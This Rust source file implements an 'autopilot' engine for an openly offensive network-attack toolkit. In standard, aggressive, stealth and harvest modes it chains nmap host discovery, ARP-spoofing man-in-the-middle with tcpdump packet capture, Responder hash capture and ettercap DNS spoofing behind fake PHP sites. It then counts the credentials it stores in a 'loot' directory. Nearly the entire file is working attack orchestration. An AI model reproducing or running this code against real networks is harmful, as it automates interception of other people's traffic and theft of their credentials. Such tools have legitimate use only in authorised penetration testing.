use std::{
    fs,
    path::Path,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc, Mutex,
    },
    thread::{self, JoinHandle},
    time::{Duration, Instant},
};

use anyhow::{anyhow, Context, Result};
use log::{debug, error, info, warn};
use serde::{Deserialize, Serialize};

use crate::{
    cli::AutopilotMode,
    system::{detect_interface, kill_process, kill_process_pattern, process_running_exact},
};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutopilotConfig {
    pub mode: String,
    pub interface: Option<String>,
    pub scan: bool,
    pub mitm: bool,
    pub responder: bool,
    pub dns_spoof: Option<String>,
    pub duration: u64,
    pub check_interval: u64,
}

#[derive(Debug, Clone, Serialize)]
pub struct AutopilotStatus {
    pub running: bool,
    pub mode: String,
    pub phase: String,
    pub elapsed_secs: u64,
    pub hosts_found: u32,
    pub credentials_captured: u32,
    pub packets_captured: u64,
    pub errors: Vec<String>,
}

impl Default for AutopilotStatus {
    fn default() -> Self {
        Self {
            running: false,
            mode: "none".to_string(),
            phase: "idle".to_string(),
            elapsed_secs: 0,
            hosts_found: 0,
            credentials_captured: 0,
            packets_captured: 0,
            errors: Vec::new(),
        }
    }
}

pub struct AutopilotEngine {
    status: Arc<Mutex<AutopilotStatus>>,
    stop_signal: Arc<AtomicBool>,
    thread_handle: Arc<Mutex<Option<JoinHandle<()>>>>,
}

impl AutopilotEngine {
    pub fn new() -> Self {
        Self {
            status: Arc::new(Mutex::new(AutopilotStatus::default())),
            stop_signal: Arc::new(AtomicBool::new(false)),
            thread_handle: Arc::new(Mutex::new(None)),
        }
    }

    pub fn start(&self, root: &Path, mode: AutopilotMode, config: AutopilotConfig) -> Result<()> {
        // Atomically check and set running flag to prevent race condition
        let mut status = self
            .status
            .lock()
            .map_err(|e| anyhow!("Status mutex poisoned: {}", e))?;

        if status.running {
            return Err(anyhow!("Autopilot is already running"));
        }

        // Reset stop signal
        self.stop_signal.store(false, Ordering::Relaxed);

        // Initialize status
        status.running = true;
        status.mode = format!("{:?}", mode);
        status.phase = "initializing".to_string();
        status.elapsed_secs = 0;
        status.errors.clear();

        // Clone Arc references before spawning
        let status_clone = self.status.clone();
        let stop_clone = self.stop_signal.clone();
        let root_path = root.to_path_buf();

        // Release lock before spawning thread
        drop(status);

        // Spawn autopilot thread with proper cleanup
        let handle = thread::spawn(move || {
            let start_time = Instant::now();

            // Run autopilot and capture result
            let result = run_autopilot(
                &root_path,
                mode,
                config,
                status_clone.clone(),
                stop_clone.clone(),
                start_time,
            );

            // Always cleanup processes, regardless of success/failure
            cleanup_processes();

            // Handle error
            if let Err(e) = result {
                error!("Autopilot error: {}", e);
                if let Ok(mut status) = status_clone.lock() {
                    add_error_limited(&mut status, format!("{}", e));
                    status.running = false;
                }
            }

            info!("Autopilot thread terminated");
            if let Ok(mut status) = status_clone.lock() {
                status.running = false;
                status.phase = "stopped".to_string();
            }
        });

        // Save thread handle
        let mut thread_guard = self
            .thread_handle
            .lock()
            .map_err(|e| anyhow!("Thread handle mutex poisoned: {}", e))?;
        *thread_guard = Some(handle);

        Ok(())
    }

    pub fn stop(&self) -> Result<()> {
        self.stop_signal.store(true, Ordering::Relaxed);

        // Kill all attack processes immediately
        cleanup_processes();

        info!("Autopilot stop signal sent");

        // Wait for thread to finish (with timeout)
        if let Ok(mut guard) = self.thread_handle.lock() {
            if let Some(handle) = guard.take() {
                // Give thread 5 seconds to cleanup
                let start = Instant::now();
                while !handle.is_finished() && start.elapsed() < Duration::from_secs(5) {
                    thread::sleep(Duration::from_millis(100));
                }

                // Try to join
                let _ = handle.join();
            }
        }

        Ok(())
    }

    pub fn get_status(&self) -> AutopilotStatus {
        self.status.lock().map(|s| s.clone()).unwrap_or_else(|_| {
            warn!("Status mutex poisoned, returning default");
            AutopilotStatus::default()
        })
    }

    pub fn is_running(&self) -> bool {
        self.status.lock().map(|s| s.running).unwrap_or_else(|_| {
            warn!("Status mutex poisoned in is_running check");
            false
        })
    }
}

// Helper function to cleanup all attack processes
fn cleanup_processes() {
    use crate::system::enable_ip_forwarding;

    let _ = kill_process("nmap");
    let _ = kill_process("arpspoof");
    let _ = kill_process("tcpdump");
    let _ = kill_process_pattern("Responder.py");
    let _ = kill_process("ettercap");
    let _ = kill_process("php");

    // Disable IP forwarding
    let _ = enable_ip_forwarding(false);

    info!("Cleanup: all attack processes terminated");
}

// Helper function to add error with size limit
const MAX_ERRORS: usize = 100;

fn add_error_limited(status: &mut AutopilotStatus, error: String) {
    status.errors.push(error);
    if status.errors.len() > MAX_ERRORS {
        status.errors.remove(0);
    }
}

fn run_autopilot(
    root: &Path,
    mode: AutopilotMode,
    config: AutopilotConfig,
    status: Arc<Mutex<AutopilotStatus>>,
    stop_signal: Arc<AtomicBool>,
    start_time: Instant,
) -> Result<()> {
    info!("Autopilot starting in {:?} mode", mode);

    // Detect interface
    let interface_info = detect_interface(config.interface.clone())?;
    let interface = interface_info.name.clone();

    update_phase(&status, "interface_detected");
    info!("Using interface: {}", interface);

    // Execute based on mode
    match mode {
        AutopilotMode::Standard => {
            run_standard_mode(root, &interface, &config, &status, &stop_signal, start_time)?;
        }
        AutopilotMode::Aggressive => {
            run_aggressive_mode(root, &interface, &config, &status, &stop_signal, start_time)?;
        }
        AutopilotMode::Stealth => {
            run_stealth_mode(root, &interface, &config, &status, &stop_signal, start_time)?;
        }
        AutopilotMode::Harvest => {
            run_harvest_mode(root, &interface, &config, &status, &stop_signal, start_time)?;
        }
    }

    Ok(())
}

fn run_standard_mode(
    root: &Path,
    interface: &str,
    config: &AutopilotConfig,
    status: &Arc<Mutex<AutopilotStatus>>,
    stop_signal: &Arc<AtomicBool>,
    start_time: Instant,
) -> Result<()> {
    // Phase 1: Network scan
    if config.scan && !check_stop(stop_signal, status, start_time)? {
        update_phase(status, "scanning");
        run_network_scan(root, interface)?;
        wait_for_scan_completion(status, stop_signal, start_time)?;
    }

    // Phase 2: Start MITM
    if config.mitm && !check_stop(stop_signal, status, start_time)? {
        update_phase(status, "mitm_starting");
        start_mitm_attack(root, interface, stop_signal)?;
        thread::sleep(Duration::from_secs(5));
    }

    // Phase 3: Start Responder
    if config.responder && !check_stop(stop_signal, status, start_time)? {
        update_phase(status, "responder_starting");
        start_responder(root, interface)?;
        thread::sleep(Duration::from_secs(3));
    }

    // Phase 4: Optional DNS spoofing
    if let Some(site) = &config.dns_spoof {
        if !check_stop(stop_signal, status, start_time)? {
            update_phase(status, "dns_spoof_starting");
            start_dns_spoof(root, interface, site)?;
            thread::sleep(Duration::from_secs(3));
        }
    }

    // Phase 5: Monitor and collect
    update_phase(status, "monitoring");
    monitor_loop(root, config, status, stop_signal, start_time)?;

    Ok(())
}

fn run_aggressive_mode(
    root: &Path,
    interface: &str,
    config: &AutopilotConfig,
    status: &Arc<Mutex<AutopilotStatus>>,
    stop_signal: &Arc<AtomicBool>,
    start_time: Instant,
) -> Result<()> {
    update_phase(status, "launching_all_attacks");

    // Start everything simultaneously with proper error handling
    let mut started_components = Vec::new();

    if config.scan {
        if let Err(e) = run_network_scan(root, interface) {
            warn!("Failed to start scan: {}", e);
        } else {
            started_components.push("scan");
        }
    }

    if config.mitm {
        if let Err(e) = start_mitm_attack(root, interface, stop_signal) {
            warn!("Failed to start MITM: {}", e);
        } else {
            started_components.push("mitm");
        }
    }

    if config.responder {
        if let Err(e) = start_responder(root, interface) {
            warn!("Failed to start Responder: {}", e);
        } else {
            started_components.push("responder");
        }
    }

    if let Some(site) = &config.dns_spoof {
        if let Err(e) = start_dns_spoof(root, interface, site) {
            warn!("Failed to start DNS spoof: {}", e);
        } else {
            started_components.push("dns_spoof");
        }
    }

    info!(
        "Aggressive mode started components: {:?}",
        started_components
    );
    thread::sleep(Duration::from_secs(10));
    update_phase(status, "aggressive_monitoring");
    monitor_loop(root, config, status, stop_signal, start_time)?;

    Ok(())
}

fn run_stealth_mode(
    root: &Path,
    interface: &str,
    config: &AutopilotConfig,
    status: &Arc<Mutex<AutopilotStatus>>,
    stop_signal: &Arc<AtomicBool>,
    start_time: Instant,
) -> Result<()> {
    update_phase(status, "stealth_scan");

    // Slow scan with minimal noise
    if config.scan && !check_stop(stop_signal, status, start_time)? {
        run_stealth_scan(root, interface)?;
        wait_for_scan_completion(status, stop_signal, start_time)?;
    }

    // Passive monitoring only
    update_phase(status, "passive_monitoring");

    if config.responder && !check_stop(stop_signal, status, start_time)? {
        start_responder(root, interface)?;
    }

    monitor_loop(root, config, status, stop_signal, start_time)?;

    Ok(())
}

fn run_harvest_mode(
    root: &Path,
    interface: &str,
    config: &AutopilotConfig,
    status: &Arc<Mutex<AutopilotStatus>>,
    stop_signal: &Arc<AtomicBool>,
    start_time: Instant,
) -> Result<()> {
    update_phase(status, "harvest_setup");

    // Focus on credential capture
    if config.mitm && !check_stop(stop_signal, status, start_time)? {
        start_mitm_attack(root, interface, stop_signal)?;
        thread::sleep(Duration::from_secs(5));
    }

    if config.responder && !check_stop(stop_signal, status, start_time)? {
        start_responder(root, interface)?;
        thread::sleep(Duration::from_secs(3));
    }

    if let Some(site) = &config.dns_spoof {
        if !check_stop(stop_signal, status, start_time)? {
            start_dns_spoof(root, interface, site)?;
        }
    }

    update_phase(status, "harvesting_credentials");
    monitor_loop(root, config, status, stop_signal, start_time)?;

    Ok(())
}

fn run_network_scan(root: &Path, interface: &str) -> Result<()> {
    let interface_info = detect_interface(Some(interface.to_string()))?;
    let target = interface_info.network_cidr();

    let output_path = crate::system::build_loot_path(root, "autopilot")?;

    let mut cmd = std::process::Command::new("nmap");
    cmd.args(["-sn", "-T4", &target])
        .args(["-oN", &output_path.to_string_lossy()])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());

    cmd.spawn().context("launching nmap")?;
    info!("Network scan started on {}", target);

    Ok(())
}

fn run_stealth_scan(root: &Path, interface: &str) -> Result<()> {
    let interface_info = detect_interface(Some(interface.to_string()))?;
    let target = interface_info.network_cidr();

    let output_path = crate::system::build_loot_path(root, "autopilot_stealth")?;

    let mut cmd = std::process::Command::new("nmap");
    cmd.args(["-sn", "-T2", "--max-rate", "10", &target])
        .args(["-oN", &output_path.to_string_lossy()])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());

    cmd.spawn().context("launching stealth nmap")?;
    info!("Stealth scan started on {}", target);

    Ok(())
}

fn start_mitm_attack(root: &Path, interface: &str, stop_signal: &Arc<AtomicBool>) -> Result<()> {
    use crate::system::{
        build_mitm_pcap_path, default_gateway_ip, enable_ip_forwarding, scan_local_hosts,
        spawn_arpspoof_pair, start_tcpdump_capture,
    };

    let interface_info = detect_interface(Some(interface.to_string()))?;
    enable_ip_forwarding(true)?;
    let gateway = default_gateway_ip()?;
    let hosts = scan_local_hosts(interface)?;

    info!("Starting MITM against {} hosts", hosts.len());

    // Check stop signal during host iteration
    for (i, host) in hosts.iter().take(10).enumerate() {
        if stop_signal.load(Ordering::Relaxed) {
            info!("Stop signal received during MITM setup after {} hosts", i);
            break;
        }

        if let Err(e) = spawn_arpspoof_pair(interface, gateway, host) {
            warn!("Failed to spawn arpspoof for host {}: {}", host.ip, e);
            continue;
        }
    }

    let pcap_path = build_mitm_pcap_path(root, Some(&interface_info.network_cidr()))?;
    start_tcpdump_capture(interface, &pcap_path)?;

    info!("MITM attack started, capturing to {}", pcap_path.display());

    Ok(())
}

fn start_responder(root: &Path, interface: &str) -> Result<()> {
    let responder_path = root.join("Responder").join("Responder.py");

    if !responder_path.exists() {
        return Err(anyhow!(
            "Responder.py not found at {}",
            responder_path.display()
        ));
    }

    // Ensure loot directory exists
    let loot_dir = root.join("loot").join("Responder");
    fs::create_dir_all(&loot_dir).context("creating Responder loot directory")?;

    let mut cmd = std::process::Command::new("python3");
    cmd.arg(&responder_path)
        .args(["-I", interface, "-w", "-f"])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .stdin(std::process::Stdio::null());

    cmd.spawn().context("launching Responder")?;
    info!("Responder started on {}", interface);

    Ok(())
}

fn start_dns_spoof(root: &Path, interface: &str, site: &str) -> Result<()> {
    use crate::system::{rewrite_ettercap_dns, sanitize_label, start_ettercap, start_php_server};

    let interface_info = detect_interface(Some(interface.to_string()))?;
    rewrite_ettercap_dns(interface_info.address)?;

    let site_dir = root.join("DNSSpoof").join("sites").join(site);
    if !site_dir.exists() {
        return Err(anyhow!("DNS spoof site '{}' not found", site));
    }

    let label = sanitize_label(&interface_info.network_cidr());
    let capture_dir = root
        .join("loot")
        .join("Ethernet")
        .join(label)
        .join("dnsspoof")
        .join(site);
    std::fs::create_dir_all(&capture_dir).ok();

    start_php_server(&site_dir, Some(&capture_dir))?;
    thread::sleep(Duration::from_secs(2));
    start_ettercap(interface)?;

    info!("DNS spoofing started for site: {}", site);

    Ok(())
}

fn wait_for_scan_completion(
    status: &Arc<Mutex<AutopilotStatus>>,
    stop_signal: &Arc<AtomicBool>,
    start_time: Instant,
) -> Result<()> {
    for _ in 0..60 {
        if check_stop(stop_signal, status, start_time)? {
            return Ok(());
        }

        if !process_running_exact("nmap")? {
            info!("Scan completed successfully");
            return Ok(());
        }

        thread::sleep(Duration::from_secs(2));
    }

    // Timeout - kill scan and update status
    warn!("Scan timeout after 120 seconds, terminating nmap");
    let _ = kill_process("nmap");
    update_phase(status, "scan_timeout");

    Ok(())
}

fn monitor_loop(
    root: &Path,
    config: &AutopilotConfig,
    status: &Arc<Mutex<AutopilotStatus>>,
    stop_signal: &Arc<AtomicBool>,
    start_time: Instant,
) -> Result<()> {
    let check_interval = Duration::from_secs(config.check_interval);

    loop {
        // Interruptible sleep - check stop signal every 100ms
        let sleep_start = Instant::now();
        while sleep_start.elapsed() < check_interval {
            if stop_signal.load(Ordering::Relaxed) {
                info!("Stop signal received in monitor loop");
                return Ok(());
            }
            thread::sleep(Duration::from_millis(100));
        }

        if check_stop(stop_signal, status, start_time)? {
            break;
        }

        // Check if duration limit reached
        if config.duration > 0 {
            let elapsed = start_time.elapsed().as_secs();
            if elapsed >= config.duration {
                info!("Autopilot duration limit reached");
                break;
            }
        }

        // Update statistics
        if let Err(e) = update_statistics(root, status) {
            warn!("Failed to update statistics: {}", e);
        }
    }

    Ok(())
}

fn update_statistics(root: &Path, status: &Arc<Mutex<AutopilotStatus>>) -> Result<()> {
    let creds = count_credentials(root)?;
    let packets = count_packets(root)?;

    match status.lock() {
        Ok(mut s) => {
            s.credentials_captured = creds;
            s.packets_captured = packets;
        }
        Err(e) => {
            warn!("Status mutex poisoned during statistics update: {}", e);
        }
    }

    Ok(())
}

fn count_credentials(root: &Path) -> Result<u32> {
    let responder_dir = root.join("loot").join("Responder");
    if !responder_dir.exists() {
        return Ok(0);
    }

    let mut count = 0u32;
    for entry in walkdir::WalkDir::new(&responder_dir).max_depth(2) {
        let entry = entry?;
        if entry.file_type().is_file() {
            match fs::read_to_string(entry.path()) {
                Ok(content) => {
                    let line_count = content.lines().filter(|l| l.contains("::")).count();
                    // Use saturating_add to prevent overflow
                    count = count.saturating_add(line_count as u32);
                }
                Err(e) => {
                    debug!("Could not read file {:?}: {}", entry.path(), e);
                }
            }
        }
    }

    Ok(count)
}

fn count_packets(root: &Path) -> Result<u64> {
    let mitm_dir = root.join("loot").join("MITM");
    if !mitm_dir.exists() {
        return Ok(0);
    }

    let mut total = 0u64;
    for entry in walkdir::WalkDir::new(&mitm_dir).max_depth(2) {
        let entry = entry?;
        if entry.path().extension().and_then(|s| s.to_str()) == Some("pcap") {
            match entry.metadata() {
                Ok(metadata) => {
                    // Use saturating_add to prevent overflow
                    total = total.saturating_add(metadata.len() / 100);
                }
                Err(e) => {
                    debug!("Could not get metadata for {:?}: {}", entry.path(), e);
                }
            }
        }
    }

    Ok(total)
}

fn update_phase(status: &Arc<Mutex<AutopilotStatus>>, phase: &str) {
    match status.lock() {
        Ok(mut s) => {
            s.phase = phase.to_string();
            info!("Autopilot phase: {}", phase);
        }
        Err(e) => {
            warn!("Status mutex poisoned during phase update: {}", e);
        }
    }
}

fn check_stop(
    stop_signal: &Arc<AtomicBool>,
    status: &Arc<Mutex<AutopilotStatus>>,
    start_time: Instant,
) -> Result<bool> {
    if stop_signal.load(Ordering::Relaxed) {
        info!("Autopilot stop signal received");
        return Ok(true);
    }

    // Update elapsed time
    match status.lock() {
        Ok(mut s) => {
            s.elapsed_secs = start_time.elapsed().as_secs();
        }
        Err(e) => {
            warn!("Status mutex poisoned during elapsed time update: {}", e);
        }
    }

    Ok(false)
}
